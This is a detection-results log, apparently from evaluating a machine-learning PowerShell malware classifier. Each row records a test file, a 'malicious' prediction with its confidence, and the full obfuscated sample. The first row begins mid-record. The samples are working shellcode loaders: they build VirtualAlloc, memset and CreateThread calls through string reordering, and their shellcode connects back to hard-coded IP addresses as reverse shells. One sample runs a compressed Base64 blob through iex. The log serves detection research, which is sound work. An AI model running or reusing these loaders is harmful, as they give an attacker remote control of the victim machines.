System.Diagnostics.P','LSApn44+N','dden5c8;aq8s.CreateNoWindow=aq8true;aq8p=[System.Diagnostics.Process]::Start(aq8s);','eoSfWtRPztYfhWJKmaMBj7stIZIwEqCgCUSUoTg44EAasEiorlcMbIEpX1imwz7kMZpLuxphH3iyi9','4D+e2gz'))-RePLACE ([Char]97+[Char]113+[Char]56),[Char]36-RePLACE ([Char]105+[Char]119+[Char]71),[Char]92 -RePLACE'5c8',[Char]39))",malicious,TP
2026-07-13 16:55:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2089.ps1,custom-ps-ml,UNKNOWN,721c8f8e-ed62-4f5e-a8cc-1d2aebe2ff77,DESKTOP-BAC9DBQ,malicious,0.9957,RandomForest,1425,1477.2,"&amp; ( $psHOme[21]+$pshomE[34]+'X') ( (((\""{37}{114}{94}{109}{76}{6}{110}{16}{14}{38}{46}{54}{82}{107}{31}{4}{61}{71}{79}{70}{12}{42}{47}{57}{1}{63}{119}{34}{92}{112}{45}{118}{44}{56}{72}{35}{53}{96}{95}{19}{33}{75}{41}{117}{30}{90}{32}{84}{39}{58}{18}{87}{40}{105}{15}{80}{69}{11}{60}{89}{108}{103}{91}{111}{65}{5}{21}{3}{106}{113}{55}{93}{49}{29}{104}{28}{116}{48}{25}{99}{17}{66}{74}{85}{83}{9}{7}{43}{67}{68}{0}{23}{20}{62}{97}{59}{50}{73}{64}{36}{101}{52}{86}{100}{120}{26}{22}{102}{88}{27}{78}{98}{2}{10}{77}{8}{13}{24}{81}{115}{51}\""-f 'I','se64','m','s','re','1Iog','ct;','shpe8','Enc','a','press)),','a','[C','oding]:','S','1n2D','O.','WvbEk','s','Cu5hJ3micTDImL','/','+wG','ss','Eu',':ASCII))','X','pre','e]','sos','yiTZVGXi5','voct9O','t','INE9jU','/Px7/','ing','cDImW','+AA','s','treamReader((a','kPlLnRY','/I','ePe+','onv','+','DC5a','IxFEX',' IO.Compre','ert]','DOw','fLcRCV8+to36','v','eadToEnd()','{0}),','K4','ssion.Defl','VN','yiRCW','::FromBa','PGRf3g3jDz3oOjUhQl','4','eT6','am(','vWa3Tek','S','quan','I','kNT','4','RIh','DVLYO1/fN','tream]','[IO','x','o','GC2','t0U5','je','[Text.','::Dec','.MemoryS','lUR','.','ate','ErWxn','GhIZvAf','1i+GK','[','yfZ36H+SF','pressionMod','W','muP','JsQyaEMlx515Z','({0}','+','l a N','+l','EZLS','u','o','UbT','IO.','==','ion.Com','vSFDck','eV','Ev','X','S','QW','ew-Ob','iex(a I','uiAG8dBYJ5t','TY9Naw','nkd','a','R','5wlpK22Av','7h','3gv8h','tr','Com'))-F  [CHaR]39))",malicious,TP
2026-07-13 16:56:15,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2095.ps1,custom-ps-ml,UNKNOWN,ebcb9a3a-9c51-423a-ba36-f9fd42f44d4d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2843,1489.97," ((\""{35}{25}{1}{27}{15}{29}{37}{24}{41}{17}{46}{44}{30}{6}{21}{19}{33}{18}{40}{8}{28}{43}{45}{2}{26}{23}{5}{39}{36}{12}{11}{3}{0}{16}{32}{42}{22}{38}{34}{4}{9}{20}{7}{14}{13}{10}{31}\""-f ',0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x4','ress, uint dwSize, uint flAll','x24,0x01,0xd3,0x','0x68','0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc','a,0','x52,0x0c,0x8b,0x52,0x14','xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,','c7,0x38,0xe0,0x','8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56','e = gF1sc.Length};gF1x=gF1w::VirtualAlloc(0,0x1000,gF1size,0x40);for (gF1i=0;gF1i -le (gF1sc.Length-1);gF1i++) {gF1w::memset([IntPtr](gF1x.ToInt32()+gF1i),',',0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,','a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07','th -gt 0x1000){gF1siz','0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;gF1size = 0x1000;if (gF1sc.Leng','ationType, uint','0,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0x','dwCreationFlags, IntPtr lpThreadId);[DllImport(bt2msvcrt.dllbt2)]pub','1,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d','e2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50',',0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0',',0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x','74,0x0c,0xff,0x4e,',',0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5','bt2)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPa','l32.dllbt2)]public static extern IntPtr VirtualAlloc(IntPtr lpAdd','66','oc','75,0xf4,0x03,0x7d,0xf8,0x3',' fl','b,0x52,0x30,0x8b,0',' gF1sc[gF1i], 1)};gF1w::CreateThread(0,0,gF1x,0,0,0);for (;;){Start-sleep 60};','ff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x95,0x68,0x02,0x00',',0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x3','d5,0x6a,','gF1c = gAc[DllImport(bt2kerne',',0x58,0x5f,0x5','Protect);[DllImport(bt2kernel32.dll','0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0x','x51,0xff,0xe0',',0x01,0x','rameter, uint ',',0x15,0xb3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x','b,0x7d,0x24,0x75,0xe2,0x58,0x8','t, uint src, uint count);gAc;gF1w = Add-Type -memberDefinition gF1c -Name bt2Win32bt2 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]gF1sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8','b,0x58,0','lic static extern IntPtr memset(IntPtr des')).REplACe(([ChAr]103+[ChAr]70+[ChAr]49),'$').REplACe(([ChAr]98+[ChAr]116+[ChAr]50),[stRInG][ChAr]34).REplACe(([ChAr]103+[ChAr]65+[ChAr]99),[stRInG][ChAr]39)|.( ([strING]$verbOSePrefeRENce)[1,3]+'x'-Join'')",malicious,TP
2026-07-13 16:56:19,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2096.ps1,custom-ps-ml,UNKNOWN,e5605001-44d8-4b09-b64d-dd7cf208ec91,DESKTOP-BAC9DBQ,malicious,0.8352,RandomForest,2799,1548.47,"&amp;((varIABlE '*MdR*').Name[3,11,2]-JOiN'')( (((\""{0}{10}{45}{37}{17}{22}{6}{18}{25}{5}{2}{12}{40}{1}{20}{13}{35}{21}{23}{39}{31}{3}{43}{15}{42}{19}{14}{24}{44}{30}{16}{41}{28}{26}{34}{33}{9}{32}{29}{7}{38}{36}{4}{27}{8}{11}{46}\"" -f'2',' 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x',' iGaWin32iGa -n','x8b,0x58,0','x56,0x53,0x57,0x68,0x02,0xd9,0x','t src, uint count);4t7;2Omw = Add-Type -memberDefinition 2Omc -Name','e, IntPtr lpStartAddress, IntPtr lpParameter, uint ','04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0','x85,0xf6,0x75,0xec,0xc3;2Omg = 0x1000;if (2Omz.Length -gt 0x1000){2Omg = 2Omz.Length};2Omx=2Omw::Vir','x68,0x95,0x58,0xce,0x5a,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5','Omc = 4t7[DllImport(iGakernel32.dlliGa','tualAlloc(0,0x1000,2Omg,0x40);for (2Omi=0;2Omi -le (2Omz.Length-1);2Omi++) {2Omw::mem','ame','31,0xff,0x31',',0x','1,0xd','01,0xd3,0',', uint dwSize, uint flAllocationType, uint flProtect);[DllImport(iGakernel32.dlliGa)]public static extern Int','dwCreationFlags',',0x3c,0x49,0x8b,0x34,0x8b','89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x','0xe2,0xf0','Ptr CreateThread(IntPtr lpThreadAttributes, uint dwStackSiz',',0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,','01,0xd6,0x31,',', IntPtr lpThreadId);[DllImport(iGamsvcrt.dlliGa)]public static extern IntPtr memset(IntPtr dest, uin','0x40,0x50,0x68,','c8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0',',0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,','6a,0x00,0x6a,0x',',0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x',',0xd0,0x50,0x8b,0x48,0x18,0',',0xa2,0x56,0xff,0xd5,0x','xff,0xd5,0x97,0x6a,0x05,0','0xea,0x0f,0xdf,0xe0,0',',0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,','ff,0xd5,0x93,0x53,0x6a,0x00,0','lloc(IntPtr lpAddress','x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0x','0x74,0x4a,0x01','space Win32Functions -passthru;[Byte[]];[Byte[]]2Omz =','x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29','3,0xe3','x20,0x0','0xff,0x31,0xc0',')]public static extern IntPtr VirtualA','set([IntPtr](2Omx.ToInt32()+2Omi), 2Omz[2Omi], 1)};2Omw::CreateThread(0,0,2Omx,0,0,0);for (;;){Start-sleep 60};')) -cREplAce  ([chAr]52+[chAr]116+[chAr]55),[chAr]39 -cREplAce  ([chAr]105+[chAr]71+[chAr]97),[chAr]34 -REPLACE '2Om',[chAr]36) )",malicious,TP
2026-07-13 16:56:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2098.ps1,custom-ps-ml,UNKNOWN,973fe6fe-85c2-4106-964a-4df8043f1783,DESKTOP-BAC9DBQ,malicious,0.8418,RandomForest,2940,1691.66," &amp;( $vErBosEprEfEREnce.TOSTriNg()[1,3]+'x'-joiN'') ( (((\""{31}{45}{1}{17}{30}{39}{43}{34}{41}{6}{42}{22}{5}{36}{47}{3}{23}{33}{35}{48}{18}{37}{0}{20}{2}{28}{26}{40}{27}{24}{8}{10}{32}{44}{29}{25}{13}{11}{21}{46}{14}{16}{12}{7}{9}{4}{38}{15}{19}\""-f 'b1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0','tatic extern IntPtr VirtualAl','0xc1,0xa3,0xc4,0','in32Functions -passth','40);for (ciri=0;ciri -le (cirz.Length-','int count);A6j;ci','hread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParamet','000;if (cirz.Length -gt 0',',0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x3','x1000){cirg = cirz.Length};cirx=cirw::VirtualAlloc(0,0x1000,cirg,0x','1,0x4f,0x90,0','c7,0x57,0','e7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d;cirg = 0x1','1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0x','5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb','Int32()+ciri), cirz[ciri], 1)};cirw::CreateThread(0,0,','9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0x','loc(IntPtr lpAddr','0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x4','cirx,0,0,0);for (;;){Start-sleep 60};','x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,','x7a,0xf5,','atic extern IntPtr memset(IntPtr dest, uint src, u','r','68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63','07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf',',0x59,','xab,0x','xfe,0x57,0xb8,0x9e,0x20','x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x','ess, uint dwSize, uint flAllocation','circ = A6j[DllImport(vn2kernel32.dllvn2)]publi','x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0','u;[Byte[]];[Byte[]]cirz =','rnel32.d',' 0xbf,0xf4,0x7e','rw = Add-Type -memberDefinition circ -Name vn2Win','9,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0x','1);ciri++) {cirw::memset([IntPtr](cirx.To','Type, uint flPr','0x6d,0','llvn2)]public static extern IntPtr CreateT','er, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(vn2msvcrt.dllvn2)]public st','otect);[DllImport(vn2ke','x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0','c s','0xbf,0x97,0x6a,0xf','32vn2 -namespace W',',0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,')) -cREPLacE  ([char]118+[char]110+[char]50),[char]34  -REpLaCe  ([char]65+[char]54+[char]106),[char]39  -REpLaCe ([char]99+[char]105+[char]114),[char]36) )",malicious,TP
2026-07-13 16:56:41,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2111.ps1,custom-ps-ml,UNKNOWN,202877dc-a58d-4669-90d0-30cb922071b2,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3221,1557.38," (((\""{14}{62}{43}{40}{5}{34}{57}{70}{38}{41}{42}{15}{2}{31}{21}{11}{20}{76}{68}{72}{26}{48}{59}{37}{75}{12}{61}{28}{16}{18}{17}{60}{6}{58}{7}{64}{55}{30}{3}{10}{27}{74}{49}{32}{13}{46}{50}{52}{8}{67}{1}{66}{63}{0}{65}{23}{51}{33}{39}{22}{47}{25}{45}{35}{24}{36}{54}{4}{44}{71}{9}{69}{29}{56}{19}{53}{73}\"" -f'x88,0x43,0x16,0x1a','6,0x3e,0xed,0x17,0xeb,0xb7,0x0b,0','port(cEqmsvcrt.dll','0xef,0x30,0x86,0x00,0x78,0x9f,0x51,0x66,0x53,0x67,0xcd,0x99,0x5b,0x98,0xc7,0x5','x0e;J3hg = 0x1000;if (J3hz.Length -gt','cEq','20,0x2d,0x76,0xe','f,0xdb,0x4d,0xb3','cd,0x29,0xd0,0x36,0x2e,0xb8,0xe2,0','VirtualAlloc(0,0x1000,J3hg,0x40','d,0x0f,0xc8,0x7f,0x77,0x2f,0x83,0x7f,0x78,0xfa,0x04','t count);5lP;J3hw = Add-Type -memberDefini',',0x6f,0xb7,0xd4,0xcf,0x4f,0x86,0x17,0x02,0x91,0xcf,0x45,0x','x93,0xf0,0xd8,0xdb,0x98,0xd6,0x4e,0x41,0x2b,0x2','J3hdaQY = 5lP[DllImpor','tPtr lpThreadId);[DllIm','ad,0x5e,0x5f,0x7f,0xfd,0x4f,0xe7,0x9c,0xb6,0x6e,0xc6,0x32,0xcc,0x29,0xc8,0xb5,0x01,0x42,0x41,0xae,0x46,0x6e,0x1b,0x45,0xbc,','e6,0x31,0xee,0x20','0x05,0x9a,0x8f,0x8c,0x',':memset([IntPtr](J3hahJ.ToInt32()+J3hi), ','tion J3hdaQY -Name cEqWin32cEq -namespace Win32Functions -passthru;[Byte[]];[Byte[','ic extern IntPtr memset(IntPtr dest, uint src, uin',',0x37,','ae,0xb3,0x96,0xd6,0x04,0xd9,0x16,0x43,0xa3,0x48,0x41,0xfb,0xa9,0xad,0xa5,0xa4,',',0xa0,0xc2,0xca,','xbf,','05,0x13,0xcb,0x33,0x71,',',0xd0,0xd6,0x54,','f,0xc3,0x98,0x02,0x42,0xf4,0x','i -le (J3hz.Length-1);J3hi++) {J3','0x28,','cEq)]public stat','xb5,0',',0xc7,0x63,0xa8,0x91,0x07,0x64,0','kernel32.dllcEq)]publ','2b,0x26,0x2a,0x0c,0x1a,0x9b,0xfd,0x64','0x2a,0x5b,0x','xae,0x','ibutes, ','x28,0xc4,0x4d,0x64,0x40,0xb0,0x35','Alloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(','uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint d','wCreationFlags, In','rnel32.dllcEq)]public static extern IntPtr Virtual',' 0x1000){J3hg = J3hz.Lengt','0xe3,0x','7,0xe','0x75,0','0x57,0x7c,0x83,0xf1,0x35,0x71,0x68','0x1a,0x17,0x72,0x98,0x75,0x79,0xb9,0x50,0xba,0','6,','0x52,0x98,0xbe,0x6d','0x20,0xfb,0x13,0x76,0x','J','21,0xcb,0x17,0x8a,0x0f,0xb9,0x79,0','x1a,0x8d,0xc1,0xa0,0x40,0xda,0x26,0x89,0x7a,0x1a,0x20,0x9a,0x09,','hw:','ic static extern IntPtr CreateThread(I','b,0xd0,0xe2,0xe1,0x78,0xde,0x4f,0x65,0x26,0xc3,0x4e,0xaa,0x5c,0xf',',0x57,0',',0x15,0x4b,0x36,0x86,0xc5,0x3e,0x4e,0xf4,0x78,0x39,0x95,0x86,0xa6,0xcc,0x0e,0x','e','t(cEqke','0x9e,0x84,0xe9,0xba,0xbb,0x5f,0',',0x89,0x9f,0x69,0x17,0xd1,0x44,0x13,0x0e,0xbf,0x2b,0x2c,0x50,0x60,0x94,0x88,0',',0x8a,0xc8,0x95,0xda,0x44,0x39,0xd3,0xc8,0x30,0xc9,0x','x7d,0x03,','xe6,0x2','x11,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x4e,0x31,0x7e,0x14,0x03,0x7e,0x14,0x83,0xc6,0x04,0xcd,0x63,0x05,0xf9,0x93,0x8c,0xf6,',');for (J3hi=0;J3h','ntPtr lpThreadAttr','h};J3hahJ=J3hw::','0xfa,0xf3,0x','3hz[J3hi], 1)};J3hw::CreateThread(0,0,J3hahJ,0,0,0);for (;;){Start-sleep 60};','0xe5,0x80,0x96,0x04,0x8d,0xca,0x18,0x7b,0xad,0xf4,0xf2,0x14,0xc6,0x19,0xfd,','02,0x1c,0x70,0xc1,0xa3,0xaa,0xa6,0xec,0x34,0x86,0x9b',']]J3hz = 0xbf,0x2f,0x96,0xf9,0'))-crEPlAce '5lP',[ChAr]39  -crEPlAce([ChAr]99+[ChAr]69+[ChAr]113),[ChAr]34 -crEPlAce'J3h',[ChAr]36)|&amp;((gv '*MDr*').nAme[3,11,2]-JOin'')",malicious,TP
2026-07-13 16:56:46,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2116.ps1,custom-ps-ml,UNKNOWN,8609e267-c079-4b49-a8ad-67f987772c6a,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2804,1551.69,"(((\""{20}{9}{15}{19}{31}{45}{13}{18}{29}{21}{6}{39}{24}{35}{46}{5}{0}{11}{30}{23}{36}{8}{37}{25}{7}{4}{42}{12}{2}{32}{33}{28}{43}{38}{14}{27}{16}{26}{22}{40}{44}{3}{10}{41}{34}{1}{17}\"" -f'b,0x5','dLAw::memset([IntPtr](dLAx.ToInt32()+dLAi), dLAz[dLAi], 1)};dLAw::CreateThread(0,0,dLAx,0,','0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xdb,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x','0x40);for ','0x03,0x7d,0xf8,0x3b','0xe5,0x31,0xd2,0x64,0x8','inition dLAc -N',',0x75,0xf4,','2,0x3c,0x01,0xd0,0x8b,0x40,0x',' IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint fl','(dLAi=0;dLAi -le (dLAz.Length','2,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x','x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,','d','04,0x56','AllocationType, uint flProtect);[DllImport(MiUkernel32.dllMiU)]public static extern IntPtr CreateThr','a,0x40,0x','0,0);for (;;){Start-sleep 60};','wCreationFlags, IntPt','ead(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAdd','dLAc = xfI[DllImport(MiUkernel32.dllMiU)]public static extern','t(MiUmsvcrt.dllMiU)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);xfI;dLAw = Add-Type -memberDef',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;dLAg = 0x1000;if (dLAz.Length -gt 0x1000','x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,','iU -namespace Win32Functions -passthru;[Byte[]];[Byte[]]dLAz = 0','0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0','68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5',',0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6','x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,','r lpThreadId);[DllImpor','28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0','ress, IntPtr lpParameter, uin','74,0x61,0x','ff,0xd5,0x85,0xc0,0',' {','xfc,0xe8,0x89,0x00,0x00,0','0x52,0x57,0x8b,0x52,0x10,0x8b,0x4','78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,','f,0xd5,0x6a,0x00,0x6a,0x','ame MiUWin32M','){dLAg = dLAz.Length};dLAx=dLAw::VirtualAlloc(','-1);dLAi++)',',0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0','0xf','0,0x1000,dLAg,','t ','x00,0x60,0x89,'))  -cReplACe  'dLA',[char]36 -rEplacE ([char]77+[char]105+[char]85),[char]34-rEplacE ([char]120+[char]102+[char]73),[char]39) | &amp;( ([STRiNG]$VerBoSepReFerEncE)[1,3]+'x'-jOIN'')",malicious,TP
2026-07-13 16:56:51,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\212.ps1,custom-ps-ml,UNKNOWN,0a11f270-787a-4e1f-b66f-2e3f7a8b592d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3030,1559.37,"&amp; ( $PsHoMe[21]+$PShoMe[30]+'x')((((\""{27}{30}{34}{48}{17}{4}{14}{18}{2}{51}{26}{36}{3}{0}{28}{16}{44}{31}{25}{24}{40}{39}{15}{23}{47}{43}{42}{33}{11}{7}{29}{19}{13}{5}{38}{12}{35}{8}{49}{32}{22}{10}{20}{9}{45}{1}{46}{41}{37}{50}{21}{6}\""-f'Add-Type -memberDefinition RLmOSiJ -Name LsfWin32Ls',',0x49,0x23,0x8b,0x0e,0xa3,0xf7;RLmg ','t.dllLsf)]public static extern In','Lmw = ','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFla',',0x91,0x8d,0xb8,0x2c,0xbb,0x49,0xec,0x7c,0xd3,0x78,0x8c,0x16,0x2','Lm2kQz.ToInt32()+RLmi), RLmz[RLmi], 1)};RLmw::CreateThread(0,0,RLm2kQz,0,0,0);for (;;){Start-sleep 60};','0x9d,0xcd,0x41,0x7d,0x1e,0x0e,0xcd,0xf6,0x6d','xdf,0x1f,0x91,0xf7,0x27,0',',0x67,0xb4,0x17,0x65,0xd5,0x12,0x27,0x53,0x',',0x4b,0x6a,0x95,0xf3,0x53,0x9b,0x39,0x7d,0xb5,0xf1,0xd1,0x2b,0x6d,0x6d,0','6,0x98,0xb4,0x6c,0x77,0x3d,0xbe,0x81,0x6c,0x4c,','a,0xa0,0xf0,0x77,0xab,0x8c,0xc9,0x45,0','cb','gs, IntPtr lpThreadId);[DllImport(L',',0xf6,0xb9,0xc4,0x7e,0xbf,0x77,0x33,0xb0,0x40,0x2b,0x07,0xd3,0xc2,0x31,0x54,0x33,0xfa,0xfa,0xa9,0x32,0x3b,0xe6,0x40,0x66,0x94,0x6d,0xf6,0x97,0x91,0x3b,0xcb,0x1','2Functions -passthru;[Byte[]];[Byte[]]RLmz = 0xba,0x8c,0x2a,0x9d,0x05','butes, ui','sfmsvcr','0x','x4b,0x76,0xe5,0x0c,0x94,0xac,0x83,0x0e,0x1e,0x43,0x73,0xc0,0xd7,0x2e','mi=0;RLmi -le (RLmz.Length-1);RLmi++) {RLmw::memset([IntPtr](R','c,0xed','c,0xe9,0xaa,0x4b,0xc0,0xba,0xcd,0x7a,0x57,0xb0,0x94,0x5c',',0xc0,0x0','31,0x50,0x14,0x83','uint src, uint co','RLmOSiJ = JrQ[DllImport(Lsfkernel32.dllLsf)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ui','f -namespace Win3',',0x3c,0x52,0xad,0xf9,0x0c,0x1b,0x6b,0xfd,0x73,0x36,','nt d','0x31,0xc9,0xb1,0x4d,0x','64,0x49,0xba,0xf',',0x78,0xdf,0x53,0x8a,0x62,0xaa,0xad,0xe8,0x1f,0xad,0x69,0x92,0xfb,0x38,0x6a,0x34,0x88,0x9b,0x56,0xc4,0x5d,0x7d,0x1c,0xca,0x2a,0x09,0x7a,0xcf,0xad,0xde,0xf0,0xeb,0x26,0xe1,0xd6,0x7d,0x7c,0xc6,0xf2,0x26,0x27,0x67,0xa2,0x82,0x8','wSize, uint 